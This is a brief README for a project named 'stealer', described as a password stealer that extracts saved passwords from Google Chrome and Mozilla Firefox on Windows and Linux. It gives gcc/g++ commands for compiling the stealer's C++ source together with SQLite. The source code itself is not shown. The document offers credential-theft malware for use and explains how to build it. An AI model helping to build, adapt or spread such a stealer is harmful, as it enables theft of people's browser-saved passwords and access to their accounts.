# stealer

Password stealer for Google Chrome and Mozilla Firefox. It can be run on Windows and Linux.

You can compile it for Linux using commands below:
'''
gcc -c sqlite3.c
g++ -o <programname> -pthread stealer.cpp sqlite3.o -ldl -std=c++1z
'''
  
And for Windows using:
'''
gcc -c sqlite3.c
g++ -o <programname> stealer.cpp sqlite3.o
'''
